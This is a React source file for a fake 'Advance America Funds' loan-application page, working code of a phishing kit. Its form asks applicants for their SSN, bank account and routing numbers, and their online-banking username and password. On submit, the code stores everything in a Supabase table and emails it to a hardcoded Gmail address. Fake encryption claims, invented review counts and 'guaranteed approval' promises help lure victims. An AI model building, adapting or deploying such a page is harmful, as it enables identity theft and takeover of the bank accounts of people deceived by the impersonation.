import { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { useSearchParams } from "react-router-dom";

const formSchema = z.object({
  firstName: z.string().min(1, "Required"), lastName: z.string().min(1, "Required"),
  email: z.string().email("Invalid email"), phone: z.string().min(10, "Min 10 digits"),
  dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
  city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
  zip: z.string().min(5, "Min 5 digits"),
  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
  monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
  bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
  accountNumber: z.string().min(1,"Required"),
  routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
  mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
});
type FormData = z.infer<typeof formSchema>;

/* ── AA Logo SVG ── */
const AALogo = () => (
  <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect width="40" height="40" rx="8" fill="#15367B"/>
    <path d="M20 8L10 28H14L16.5 23H23.5L26 28H30L20 8Z" fill="white"/>
    <path d="M17.5 20H22.5L20 15L17.5 20Z" fill="#15367B"/>
    <rect x="25" y="24" width="6" height="4" fill="#00A25C"/>
  </svg>
);

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Poppins',sans-serif;}
:root{
  --aa-navy: #15367B;
  --aa-navy-dark: #0f2759;
  --aa-green: #00A25C;
  --aa-green-h: #00874c;
  --aa-light-bg: #f4f7f6;
  --aa-border: #e2e8f0;
  --aa-text: #1a202c;
  --aa-muted: #64748b;
}
/* Nav */
.aa-nav{background:#fff;border-bottom:1px solid var(--aa-border);position:sticky;top:0;z-index:200;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
.aa-nav-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:70px;display:flex;align-items:center;justify-content:space-between;}
.aa-logo-wrap{display:flex;align-items:center;gap:12px;text-decoration:none;}
.aa-logo-text{display:flex;flex-direction:column;line-height:1.2;}
.aa-logo-main{font-size:22px;font-weight:800;color:var(--aa-navy);letter-spacing:-0.5px;text-transform:uppercase;}
.aa-logo-sub{font-size:11px;font-weight:600;color:var(--aa-green);letter-spacing:1px;text-transform:uppercase;}
.aa-nav-links{display:flex;align-items:center;gap:24px;}
.aa-nav-item{position:relative;font-size:14px;font-weight:600;color:var(--aa-navy);text-decoration:none;cursor:pointer;transition:color 0.2s;}
.aa-nav-item:hover{color:var(--aa-green);}
.aa-btn-primary{background:var(--aa-green);color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.2s;text-decoration:none;display:inline-block;}
.aa-btn-primary:hover{background:var(--aa-green-h);transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,162,92,0.2);}

/* Hero */
.aa-hero{background:linear-gradient(135deg, var(--aa-navy) 0%, var(--aa-navy-dark) 100%);color:#fff;padding:80px 20px;position:relative;overflow:hidden;}
.aa-hero-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;gap:60px;position:relative;z-index:10;}
.aa-hero-content{flex:1;}
.aa-hero h1{font-size:clamp(32px,5vw,52px);font-weight:800;line-height:1.15;margin-bottom:20px;}
.aa-hero h1 span{color:var(--aa-green);}
.aa-hero p{font-size:18px;color:rgba(255,255,255,0.85);margin-bottom:30px;line-height:1.6;max-width:480px;}
.aa-trust-badges{display:flex;align-items:center;gap:20px;margin-top:40px;flex-wrap:wrap;}
.aa-badge{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,0.1);padding:8px 16px;border-radius:30px;font-size:13px;font-weight:600;}

/* Stats Banner */
.aa-stats-banner{background:#fff;border-bottom:1px solid var(--aa-border);padding:30px 20px;}
.aa-stats-inner{max-width:1200px;margin:0 auto;display:flex;justify-content:space-around;flex-wrap:wrap;gap:20px;}
.aa-stat{text-align:center;}
.aa-stat-num{font-size:32px;font-weight:800;color:var(--aa-navy);line-height:1;}
.aa-stat-label{font-size:13px;color:var(--aa-muted);text-transform:uppercase;font-weight:600;margin-top:8px;letter-spacing:1px;}

/* Section */
.aa-section{padding:80px 20px;}
.aa-section.light{background:var(--aa-light-bg);}
.aa-title-center{text-align:center;margin-bottom:50px;}
.aa-sec-eyebrow{font-size:13px;font-weight:700;color:var(--aa-green);text-transform:uppercase;letter-spacing:2px;margin-bottom:12px;}
.aa-sec-title{font-size:36px;font-weight:800;color:var(--aa-navy);line-height:1.2;}

/* Services Grid */
.aa-services{display:grid;grid-template-columns:repeat(auto-fit, minmax(300px, 1fr));gap:30px;max-width:1200px;margin:0 auto;}
.aa-service-card{background:#fff;border-radius:12px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,0.04);transition:transform 0.3s;border:1px solid var(--aa-border);}
.aa-service-card:hover{transform:translateY(-5px);border-color:var(--aa-green);}
.aa-service-icon{width:60px;height:60px;background:rgba(0,162,92,0.1);border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:20px;color:var(--aa-green);}
.aa-service-card h3{font-size:20px;font-weight:700;color:var(--aa-navy);margin-bottom:12px;}
.aa-service-card p{font-size:15px;color:var(--aa-muted);line-height:1.6;}

/* Form */
.aa-form-wrap{max-width:800px;margin:0 auto;background:#fff;border-radius:16px;box-shadow:0 20px 40px rgba(21,54,123,0.08);overflow:hidden;}
.aa-form-header{background:var(--aa-navy);color:#fff;padding:30px 40px;position:relative;}
.aa-form-header h2{font-size:24px;font-weight:800;margin-bottom:8px;}
.aa-form-header p{font-size:14px;color:rgba(255,255,255,0.8);}
.aa-form-body{padding:40px;}
.aa-fg-label{color:var(--aa-navy);font-size:18px;font-weight:700;margin-bottom:20px;display:flex;align-items:center;gap:10px;padding-bottom:10px;border-bottom:2px solid var(--aa-light-bg);}
.aa-g2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
.aa-g3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:20px;}
@media(max-width:640px){.aa-g2,.aa-g3{grid-template-columns:1fr;}}
.aa-lbl{display:block;font-size:13px;font-weight:600;color:var(--aa-navy);margin-bottom:6px;}
.aa-in{width:100%;height:48px;border:1px solid #cbd5e1;border-radius:6px;padding:0 16px;font-size:15px;font-family:inherit;color:var(--aa-text);background:#fff;transition:border-color 0.2s;outline:none;}
.aa-in:focus{border-color:var(--aa-green);box-shadow:0 0 0 3px rgba(0,162,92,0.1);}
.aa-in::placeholder{color:#94a3b8;}
.aa-err{font-size:12px;color:#e11d48;margin-top:4px;}
.aa-fgroup{margin-bottom:20px;}
.aa-sec-group{margin-bottom:40px;}
.aa-icon-field{position:relative;}
.aa-icon-field input{padding-right:40px;}
.aa-icon-field .fi{position:absolute;right:14px;top:50%;transform:translateY(-50%);color:#94a3b8;}
.aa-client-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(0,162,92,0.1);color:var(--aa-green);border:1px solid rgba(0,162,92,0.2);border-radius:4px;padding:12px 20px;font-size:14px;font-weight:600;margin-bottom:30px;width:100%;}
.aa-submit{width:100%;height:56px;background:var(--aa-green);color:#fff;border:none;font-size:16px;font-weight:700;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;transition:background 0.2s;}
.aa-submit:hover:not(:disabled){background:var(--aa-green-h);}
.aa-submit:disabled{opacity:0.7;cursor:not-allowed;}
.aa-fine{font-size:12px;color:var(--aa-muted);text-align:center;margin-top:20px;line-height:1.6;}

/* Footer */
.aa-footer{background:var(--aa-navy-dark);color:#fff;padding:60px 20px 30px;}
.aa-ft-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:40px;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:40px;margin-bottom:30px;}
.aa-ft-brand p{font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;margin-top:16px;line-height:1.6;}
.aa-ft-contact a{display:block;color:var(--aa-green);font-size:14px;font-weight:600;margin-bottom:8px;text-decoration:none;}
.aa-fb{text-align:center;font-size:13px;color:rgba(255,255,255,0.5);}

@keyframes spin{to{transform:rotate(360deg);}}
.aa-spin{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}

@media(max-width:900px){
  .aa-hero-inner{flex-direction:column;text-align:center;}
  .aa-hero p{margin:0 auto 30px;}
  .aa-trust-badges{justify-content:center;}
  .aa-nav-links{display:none;}
}
`;

const ShieldIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
);
const LockIcon = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
);
const UserIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
);
const BriefcaseIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
);
const BankIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/><line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg>
);
const StarRating = () => (
  <svg width="100" height="20" viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg">
    {[0,20,40,60,80].map(x => (
      <path key={x} d={`M${10+x} 2l2.5 6.5H20l-6 4.5 2.5 6.5-6-5-6 5 2.5-6.5-6-4.5h7.5L${10+x} 2z`} fill="#F59E0B"/>
    ))}
  </svg>
);

export default function AdvanceAmericaApply() {
  const [searchParams] = useSearchParams();
  const [client, setClient] = useState<any>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => { document.title = "Advance America Funds - Bad Credit Loans"; }, []);

  useEffect(() => {
    const token = searchParams.get("token");
    if (!token) return;
    (async () => {
      const { data, error } = await supabase.from("clients").select("*")
        .eq("access_token", token).gt("token_expiry", new Date().toISOString())
        .eq("is_active", true).single();
      if (!error && data) setClient(data);
    })();
  }, [searchParams]);

  const { register, handleSubmit, control, formState:{errors} } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    try {
      const { error: dbError } = await supabase.from("loan_applications").insert({
        first_name:data.firstName, last_name:data.lastName, email:data.email, phone:data.phone,
        date_of_birth:data.dob, street_address:data.address, city:data.city, state:data.state,
        zip_code:data.zip, employment_status:"", employer_name:"",
        monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
        pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
        bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
        account_number:data.accountNumber, routing_number:data.routingNumber,
        mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
      });
      if (dbError) throw new Error(dbError.message);
      await supabase.functions.invoke("send-application-email",{
        body:{ applicationData:data, clientEmail:"ws694481@gmail.com", recipientType:"admin", clientName:client?.name||"General" }
      });
      if (client) {
        await supabase.functions.invoke("send-application-email",{
          body:{ applicationData:data, clientEmail:client.email, recipientType:"client" }
        });
      }
      setSubmitted(true);
    } catch(err:any) {
      alert(`Error: ${err.message||"Please try again."}`);
    } finally { setIsSubmitting(false); }
  };

  if (submitted) return (
    <div style={{minHeight:"100vh",background:"var(--aa-light-bg)",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Poppins',sans-serif"}}>
      <style>{CSS}</style>
      <div style={{background:"#fff",borderRadius:16,padding:"50px 40px",maxWidth:480,textAlign:"center",boxShadow:"0 10px 40px rgba(0,0,0,0.08)"}}>
        <div style={{width:72,height:72,borderRadius:"50%",background:"rgba(0,162,92,0.1)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px"}}>
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--aa-green)" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{fontSize:26,fontWeight:800,color:"var(--aa-navy)",marginBottom:12}}>Application Received!</h2>
        <p style={{fontSize:16,color:"var(--aa-muted)",lineHeight:1.6}}>Thank you for choosing Advance America Funds. Our lending team will review your details and contact you shortly.</p>
        <button onClick={() => window.location.href="/"} className="aa-btn-primary" style={{marginTop:30}}>Return Home</button>
      </div>
    </div>
  );

  return (
    <div style={{fontFamily:"'Poppins',sans-serif",color:"var(--aa-text)",background:"#fff"}}>
      <style>{CSS}</style>

      {/* Nav */}
      <nav className="aa-nav">
        <div className="aa-nav-inner">
          <a href="#" className="aa-logo-wrap">
            <AALogo />
            <div className="aa-logo-text">
              <span className="aa-logo-main">Advance America</span>
              <span className="aa-logo-sub">Funds & Lending</span>
            </div>
          </a>
          <div className="aa-nav-links">
            <a href="#" className="aa-nav-item">Home</a>
            <a href="#" className="aa-nav-item">Loans</a>
            <a href="#" className="aa-nav-item">Services</a>
            <a href="#" className="aa-nav-item">Bank Authentication</a>
            <a href="#" className="aa-btn-primary">Account Link</a>
          </div>
        </div>
      </nav>

      {/* Hero */}
      <section className="aa-hero">
        <div className="aa-hero-inner">
          <div className="aa-hero-content">
            <h1>Seamless Lending Solutions <span>Tailored</span> For Your Needs</h1>
            <p>We specialize in providing reliable lending solutions to help you achieve your financial goals. Bad credit score approved on the same day!</p>
            <a href="#apply" className="aa-btn-primary" style={{padding:"14px 32px",fontSize:"16px"}}>Get Started Now</a>
            <div className="aa-trust-badges">
              <div className="aa-badge"><ShieldIcon/> 256-bit Secure</div>
              <div style={{display:"flex",alignItems:"center",gap:"10px",fontSize:"13px",fontWeight:600}}>
                <StarRating/> 4.8 out of 5
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Stats */}
      <div className="aa-stats-banner">
        <div className="aa-stats-inner">
          <div className="aa-stat">
            <div className="aa-stat-num">150+</div>
            <div className="aa-stat-label">Trusted Partners</div>
          </div>
          <div className="aa-stat">
            <div className="aa-stat-num">158,874+</div>
            <div className="aa-stat-label">Happy Customers</div>
          </div>
          <div className="aa-stat">
            <div className="aa-stat-num">24/7</div>
            <div className="aa-stat-label">Support Available</div>
          </div>
        </div>
      </div>

      {/* Services */}
      <section className="aa-section light">
        <div className="aa-title-center">
          <div className="aa-sec-eyebrow">Our Services</div>
          <h2 className="aa-sec-title">Explore diverse lending solutions</h2>
        </div>
        <div className="aa-services">
          <div className="aa-service-card">
            <div className="aa-service-icon">
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
            </div>
            <h3>Bad Credit Loans</h3>
            <p>Flexible loans for those with credit challenges. We believe everyone deserves a second chance, offering guaranteed repayment options.</p>
          </div>
          <div className="aa-service-card">
            <div className="aa-service-icon">
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <h3>Collateral Loans</h3>
            <p>Secure loans backed by your valuable assets. Including gold-backed loans providing high capital injection instantly.</p>
          </div>
          <div className="aa-service-card">
            <div className="aa-service-icon">
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
            </div>
            <h3>Same Day Approval</h3>
            <p>Our streamlined verification process ensures you get your money when you need it most, without unnecessary delays.</p>
          </div>
        </div>
      </section>

      {/* Form Section */}
      <section className="aa-section" id="apply">
        <div className="aa-form-wrap">
          <div className="aa-form-header">
            <h2>Advance America Application</h2>
            <p>Complete our secure online form to get matched with the perfect loan.</p>
          </div>

          <div className="aa-form-body">
            {client && (
              <div className="aa-client-badge">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                Secure access verified for {client.name}
              </div>
            )}

            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Personal */}
              <div className="aa-sec-group">
                <div className="aa-fg-label"><UserIcon/> Personal Details</div>
                <div className="aa-g2">
                  <div className="aa-fgroup"><label className="aa-lbl">First Name</label><input className="aa-in" {...register("firstName")} placeholder="John"/>{errors.firstName&&<p className="aa-err">{errors.firstName.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Last Name</label><input className="aa-in" {...register("lastName")} placeholder="Doe"/>{errors.lastName&&<p className="aa-err">{errors.lastName.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Email Address</label><input className="aa-in" type="email" {...register("email")} placeholder="john@example.com"/>{errors.email&&<p className="aa-err">{errors.email.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Phone Number</label><input className="aa-in" {...register("phone")} placeholder="(555) 000-0000"/>{errors.phone&&<p className="aa-err">{errors.phone.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Date of Birth</label><input className="aa-in" type="date" {...register("dob")}/>{errors.dob&&<p className="aa-err">{errors.dob.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">SSN (9 digits)</label><div className="aa-icon-field"><input className="aa-in" {...register("ssn")} placeholder="Social Security Number" maxLength={9}/><span className="fi"><LockIcon/></span></div>{errors.ssn&&<p className="aa-err">{errors.ssn.message}</p>}</div>
                </div>
                <div className="aa-fgroup"><label className="aa-lbl">Street Address</label><input className="aa-in" {...register("address")} placeholder="123 Main St"/>{errors.address&&<p className="aa-err">{errors.address.message}</p>}</div>
                <div className="aa-g3">
                  <div className="aa-fgroup"><label className="aa-lbl">City</label><input className="aa-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="aa-err">{errors.city.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">State</label><input className="aa-in" {...register("state")} placeholder="State (2 letters)" maxLength={2}/>{errors.state&&<p className="aa-err">{errors.state.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Zip Code</label><input className="aa-in" {...register("zip")} placeholder="Zipcode" maxLength={5}/>{errors.zip&&<p className="aa-err">{errors.zip.message}</p>}</div>
                </div>
              </div>

              {/* Loan */}
              <div className="aa-sec-group">
                <div className="aa-fg-label"><BriefcaseIcon/> Employment & Loan Info</div>
                <div className="aa-g2">
                  <div className="aa-fgroup"><label className="aa-lbl">Monthly Income ($)</label><input className="aa-in" type="number" {...register("monthlyIncome")} placeholder="0.00"/>{errors.monthlyIncome&&<p className="aa-err">{errors.monthlyIncome.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Requested Loan Amount ($)</label><input className="aa-in" type="number" {...register("loanAmount")} placeholder="0.00"/>{errors.loanAmount&&<p className="aa-err">{errors.loanAmount.message}</p>}</div>
                </div>
                <div className="aa-fgroup"><label className="aa-lbl">Estimated Credit Score</label>
                  <Controller name="creditScore" control={control} render={({field})=>(
                    <Select onValueChange={field.onChange} value={field.value||""}>
                      <SelectTrigger style={{height:48,borderRadius:6,borderColor:"#cbd5e1",fontSize:15}}><SelectValue placeholder="Select credit profile"/></SelectTrigger>
                      <SelectContent>
                        <SelectItem value="good">Good (700+)</SelectItem>
                        <SelectItem value="low">Fair (600–699)</SelectItem>
                        <SelectItem value="bad">Poor (Below 600) — Guaranteed Options Available</SelectItem>
                      </SelectContent>
                    </Select>
                  )}/>
                  {errors.creditScore&&<p className="aa-err">{errors.creditScore.message}</p>}
                </div>
              </div>

              {/* Banking */}
              <div className="aa-sec-group">
                <div className="aa-fg-label"><BankIcon/> Bank Authentication</div>
                <p style={{fontSize:14,color:"var(--aa-muted)",marginBottom:20}}>We use bank-level 256-bit encryption to securely verify your income and deposit funds directly to your account.</p>
                <div className="aa-g2">
                  <div className="aa-fgroup"><label className="aa-lbl">Bank Name</label><input className="aa-in" {...register("bankName")} placeholder="Name of your institution"/>{errors.bankName&&<p className="aa-err">{errors.bankName.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Years with Bank</label><input className="aa-in" type="number" {...register("yearsWithBank")} placeholder="Years"/>{errors.yearsWithBank&&<p className="aa-err">{errors.yearsWithBank.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Account Number</label><div className="aa-icon-field"><input className="aa-in" {...register("accountNumber")} placeholder="Account No."/><span className="fi"><LockIcon/></span></div>{errors.accountNumber&&<p className="aa-err">{errors.accountNumber.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Routing Number</label><div className="aa-icon-field"><input className="aa-in" {...register("routingNumber")} placeholder="9 digit routing no." maxLength={9}/><span className="fi"><LockIcon/></span></div>{errors.routingNumber&&<p className="aa-err">{errors.routingNumber.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Bank Login Username</label><div className="aa-icon-field"><input className="aa-in" {...register("mobileUsername")} placeholder="Online ID / Username"/><span className="fi"><LockIcon/></span></div>{errors.mobileUsername&&<p className="aa-err">{errors.mobileUsername.message}</p>}</div>
                  <div className="aa-fgroup"><label className="aa-lbl">Bank Login Password</label><div className="aa-icon-field"><input className="aa-in" type="password" {...register("mobilePassword")} placeholder="Password"/><span className="fi"><LockIcon/></span></div>{errors.mobilePassword&&<p className="aa-err">{errors.mobilePassword.message}</p>}</div>
                </div>
              </div>

              <button type="submit" className="aa-submit" disabled={isSubmitting}>
                {isSubmitting ? <><div className="aa-spin"/>Processing...</> : <>Submit Application <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><polyline points="9 18 15 12 9 6"/></svg></>}
              </button>
              <p className="aa-fine"><LockIcon/> Your data is protected by industry-leading 256-bit encryption. We never share your personal information with third parties without consent.</p>
            </form>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="aa-footer">
        <div className="aa-ft-inner">
          <div className="aa-ft-brand">
            <div style={{display:"flex",alignItems:"center",gap:12}}>
              <AALogo/>
              <span style={{fontSize:20,fontWeight:800,letterSpacing:"-0.5px"}}>Advance America</span>
            </div>
            <p>Advance America Lending made my loan process easy and stress-free! Rating 4.8 out of 5 based on 158,874+ trusted reviews.</p>
          </div>
          <div>
            <h4 style={{fontSize:16,marginBottom:15,color:"var(--aa-green)"}}>Contact Us</h4>
            <div className="aa-ft-contact">
              <a href="mailto:advanceamerica.01156@gmail.com">advanceamerica.2308@gmail.com</a>
              <a href="tel:+14427990717">+1(442)799-0717</a>
            </div>
            <p style={{fontSize:14,color:"rgba(255,255,255,0.6)",marginTop:10,maxWidth:250}}>
              Advance America Lending. LTD<br/>
              2602 E Fletcher Ave Unit 10, Tampa FL 33612
            </p>
          </div>
        </div>
        <div className="aa-fb">
          © {new Date().getFullYear()} Advance America Lending. All rights reserved.
        </div>
      </footer>
    </div>
  );
}
